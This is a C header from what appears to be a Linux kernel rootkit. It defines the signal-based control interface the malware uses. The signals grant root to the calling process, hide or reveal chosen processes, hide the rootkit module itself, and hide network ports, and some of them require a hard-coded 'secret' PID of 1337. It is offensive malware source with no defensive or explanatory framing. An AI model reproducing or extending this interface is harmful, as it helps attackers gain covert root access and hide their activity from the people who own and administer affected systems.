#ifndef _ROOTKIT_UAPI_H_
#define _ROOTKIT_UAPI_H_

#define SIGROOT     42 /* Elevate the current process to root (needs PID_SECRET) */
#define SIGHIDE     43 /* Hide the process with the given PID */
#define SIGSHOW     44 /* Show the process with the given PID */
#define SIGAUTH     45 /* Authorize the process with the given PID */
#define SIGMODHIDE  46 /* Hide the rootkit (needs PID_SECRET) */
#define SIGMODSHOW  47 /* Show the rootkit (needs PID_SECRET) */
#define SIGPORTHIDE 48 /* Add a port to the hidden ports list */
#define SIGPORTSHOW 49 /* Remove a port from the hidden ports list */

#define PID_SELF   (pid_t)0    /* PID of the current process */
#define PID_SECRET (pid_t)1337 /* Secret PID that has to be used when sending some signals */

#endif
